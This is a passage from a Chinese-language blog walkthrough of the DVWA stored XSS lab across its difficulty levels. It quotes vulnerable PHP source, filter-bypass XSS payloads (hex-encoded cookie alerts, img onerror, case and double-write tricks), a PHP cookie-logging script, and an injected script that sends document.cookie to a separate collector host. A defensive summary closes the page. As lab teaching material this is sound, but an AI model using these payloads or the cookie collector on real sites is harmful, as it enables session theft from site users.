</span></span><span style=display:flex><span>  	<span style=color:#75715e>// mysqli_real_escape_string() 函数用于对字符串中的特殊字符进行转义，使得这个字符串是一个合法的 SQL 语句。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// GLOBALS 是引用全局作用域中可用的全部变量，是一个包含了全部变量的全局组合数组。
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Sanitize message input
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $message <span style=color:#f92672>=</span> ((<span style=color:#a6e22e>isset</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>is_object</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>])) <span style=color:#f92672>?</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>],  $message ) <span style=color:#f92672>:</span> ((<span style=color:#a6e22e>trigger_error</span>(<span style=color:#e6db74>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span>, <span style=color:#a6e22e>E_USER_ERROR</span>)) <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Sanitize name input
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $name <span style=color:#f92672>=</span> ((<span style=color:#a6e22e>isset</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>is_object</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>])) <span style=color:#f92672>?</span> <span style=color:#a6e22e>mysqli_real_escape_string</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>],  $name ) <span style=color:#f92672>:</span> ((<span style=color:#a6e22e>trigger_error</span>(<span style=color:#e6db74>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span>, <span style=color:#a6e22e>E_USER_ERROR</span>)) <span style=color:#f92672>?</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Update database
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $query  <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;</span><span style=color:#e6db74>$message</span><span style=color:#e6db74>&#39;, &#39;</span><span style=color:#e6db74>$name</span><span style=color:#e6db74>&#39; );&#34;</span>;
</span></span><span style=display:flex><span>    $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_query</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>],  $query ) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>( <span style=color:#e6db74>&#39;&lt;pre&gt;&#39;</span> <span style=color:#f92672>.</span> ((<span style=color:#a6e22e>is_object</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>])) <span style=color:#f92672>?</span> <span style=color:#a6e22e>mysqli_error</span>($GLOBALS[<span style=color:#e6db74>&#34;___mysqli_ston&#34;</span>]) <span style=color:#f92672>:</span> (($___mysqli_res <span style=color:#f92672>=</span> <span style=color:#a6e22e>mysqli_connect_error</span>()) <span style=color:#f92672>?</span> $___mysqli_res <span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>)) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;&lt;/pre&gt;&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//mysql_close();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>由于对输入内容没有任何过滤，因此可以注入任意的代码</p><p>尝试以下代码，发现不行</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#e6db74>&#39;document.cookie&#39;</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071442812.png alt=image-20221202095848650></figure></p><p>因为使用了<code>trim(string,charlist)</code>，所以并没有cookie弹出，将字符串<strong>编码</strong>即可</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>0x646F63756D656E742E636F6F6B6965</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/script&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>0x646F63756D656E742E636F6F6B6965</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071442558.png alt=image-20221202121119499></figure></p><p><strong>在另一台攻击机上获取靶机的cookie</strong></p><ol><li><p>新建一台攻击机，端口设为4567</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run --rm -it -p 4567:80 vulnerables/web-dvwa
</span></span></code></pre></div></li><li><p>在该攻击机指定路径写入脚本cookie.php</p><blockquote><p>该脚本能够获取cookie并存入<code>./cookie.txt</code></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    $cookie <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;cookie&#39;</span>];
</span></span><span style=display:flex><span>    $ip <span style=color:#f92672>=</span> <span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>);
</span></span><span style=display:flex><span>    $time <span style=color:#f92672>=</span> <span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#39;Y-m-d g:i:s&#39;</span>);
</span></span><span style=display:flex><span>    $ref <span style=color:#f92672>=</span><span style=color:#a6e22e>getenv</span>(<span style=color:#e6db74>&#39;HTTP_REFERER&#39;</span>);
</span></span><span style=display:flex><span>    $fp <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#39;cookie.txt&#39;</span>,<span style=color:#e6db74>&#39;a&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fwrite</span>($fp,<span style=color:#e6db74>&#34; IP: &#34;</span> <span style=color:#f92672>.</span>$ip<span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74> Time: &#34;</span> <span style=color:#f92672>.</span>$time<span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74> Referer: &#34;</span> <span style=color:#f92672>.</span>$ref<span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74> </span><span style=color:#e6db74>$cookie</span><span style=color:#e6db74>: &#34;</span> <span style=color:#f92672>.</span>$cookie<span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>-------------</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fclose</span>($fp);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker cp D:<span style=color:#ae81ff>\c</span>ookie.php 4a8:/var/www/html
</span></span></code></pre></div></li><li><p>发起攻击，在靶场写入</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span>&gt;document.<span style=color:#a6e22e>write</span>(<span style=color:#e6db74>&#39;&lt;img src=&#34;http://127.0.0.1:4567/cookie.php?cookie=&#39;</span> <span style=color:#f92672>+</span> document.<span style=color:#a6e22e>cookie</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&#34; width=0 height=0 border=0 /&gt;&#39;</span>);&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div></li><li><p>回到攻击机下查看<code>/var/www/html/cookie.txt</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /var/www/html/cookie.txt
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071442886.png alt=image-20221202121946800></figure></p></li></ol><div id=medium-9 class=anchor>medium></div><h3 class="relative group">medium
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#medium-9 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><ol><li><p><strong>addslashes() 函数</strong>在每个双引号前添加反斜杠，返回在预定义字符之前添加反斜杠的字符串。</p></li><li><p><strong>strip_tags()</strong> 函数用于剥去字符串中的 HTML、XML 以及 PHP 的标签</p></li><li><p><strong>htmlspecialchars() 函数</strong>用于把预定义的字符 &ldquo;&lt;&rdquo; 和 &ldquo;>&rdquo; 转换为 HTML 实体。</p></li><li><p>Message 参数对所有的 XSS 都进行了过滤</p></li><li><p>name 参数只是过滤了 &lt; script > 标签</p><p>因此，我们可以对 name 参数进行注入。</p></li></ol><p><strong>修改前端限制的长度</strong></p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071442458.png alt=image-20221202122338484></figure></p><p><strong>构造注入语句</strong></p><blockquote><p>使用双写或者大写绕过</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>SCRIPT</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>0x646F63756D656E742E636F6F6B6965</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/SCRIPT&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>sc</span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>ript</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>0x646F63756D656E742E636F6F6B6965</span>)<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/sc&lt;script&gt;ript&gt;</span>
</span></span></code></pre></div><p>攻击成功</p><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071442650.png alt=image-20221202124211794></figure></p><div id=high-9 class=anchor>high></div><h3 class="relative group">high
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#high-9 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><p><strong>preg_replace()</strong> 函数执行一个正则表达式的搜索和替换，“*” 代表一个或多个任意字符，“i” 代表不区分大小写。也就是说 name 参数 “&lt; script >” 标签在这里被完全过滤了，但是我们可以通过其他的标签例如 img、body 等标签的事件或者iframe 等标签的 src 注入 JS 攻击脚本</p><p><strong>构造语句</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> <span style=color:#a6e22e>onerror</span><span style=color:#f92672>=</span><span style=color:#a6e22e>alert</span>(<span style=color:#ae81ff>0x646F63756D656E742E636F6F6B6965</span>)<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" src=https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/1431/202301071442046.png alt=image-20221202125533481></figure></p><div id=impossible-9 class=anchor>impossible></div><h3 class="relative group">impossible
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#impossible-9 aria-label=锚点>#</a></span></h3><p><strong>源码审计</strong></p><ol><li>使用内置的PHP函数（例如 “htmlspecialchars()”），可以转义任何会改变输入行为的值。</li><li>源码在 high 级别的基础上对 name 参数也进行了更严格的过滤，导致 name 参数也无法进行 JS 脚本注入</li><li>加入 Anti-CSRF token 防护 CSRF 攻击，进一步提高安全性。</li></ol><div id=总结与防御-8 class=anchor>总结与防御></div><h3 class="relative group">总结与防御
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#%e6%80%bb%e7%bb%93%e4%b8%8e%e9%98%b2%e5%be%a1-8 aria-label=锚点>#</a></span></h3><p>​ <strong>跨站脚本 (Cross-Site Scripting)</strong> 是一种针对 Web 程序的代码注入型漏洞攻击，它允许攻击者将恶意脚本注入网页，使得其他用户浏览网页时收到影响。所谓<strong>存储型 XSS</strong> 又称为持久型 XSS，攻击脚本会被永久保存在目标服务器的数据库或文件中，具有更高的隐蔽性。
​ 存储型 XSS 的攻击常见于论坛、博客或留言等需要提交文本的页面，攻击者将攻击脚本和文本一起注入。当文本被服务器存储下来时，恶意脚本也会被永久存放与服务器的数据库或文件中。当其他用户访问这个含有恶意脚本的页面时，恶意脚本会在用户的浏览器中执行。XSS 漏洞的修复方式有以下 2 种：</p><ol><li><strong>过滤输入的字符</strong>，例如 “ &rsquo; ”，“ " ”，“&lt;”，“>” 等非法字符；</li><li>对输出到页面的数据进行<strong>编码</strong>。</li></ol></br></br></div><script>var oid="views_docs/DVWA/index.md",oid_likes="likes_docs/DVWA/index.md"</script><script type=text/javascript src=/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js integrity="sha512-DkmXO0rQo4LHxgEti/+CJjFmQtqrxPiiBHe9CGdPPabi+pk7wgrU9R58W7aOb5E6IHp8T+N+oOe4BolK/OCmTg=="></script></section><footer class="pt-8 max-w-prose print:hidden"><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://mykaneki.github.io/docs/dvwa/&amp;subject=DVWA%e9%9d%b6%e5%9c%ba" title=通过电子邮件发送 aria-label=通过电子邮件发送><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg></span></a></section><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/docs/docker%E7%9A%84%E4%BD%BF%E7%94%A8/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">docker命令</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2023-01-07 00:00:00 +0000 UTC">2023-01-07</time></span></span></a></span>
<span><a class="flex text-right group ml-3" href=/docs/%E9%87%8D%E8%A3%85%E7%94%B5%E8%84%91/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">重装电脑</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2022-09-03 00:00:00 +0000 UTC">2022-09-03</time></span></span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer></article><div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0"><a href=#the-top class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label title>&uarr;</a></div></main><footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/tags/ title=Tags>标签</a></li><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/series/ title=Series>系列</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2023
mykaneki</p><p class="text-xs text-neutral-500 dark:text-neutral-400">由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a> 强力驱动</p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.2166d3adac1679c00a75161830ab5725d3efc0e3d3f8c2453fb01d0907948436c25f0f8a7ad824322fa22f3f9c85fd4d0a1d5c856f53b862157da25a57dc3d52.js integrity="sha512-IWbTrawWecAKdRYYMKtXJdPvwOPT+MJFP7AdCQeUhDbCXw+KetgkMi+iLz+chf1NCh1chW9TuGIVfaJaV9w9Ug=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]" data-url=https://mykaneki.github.io/ style=z-index:500><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>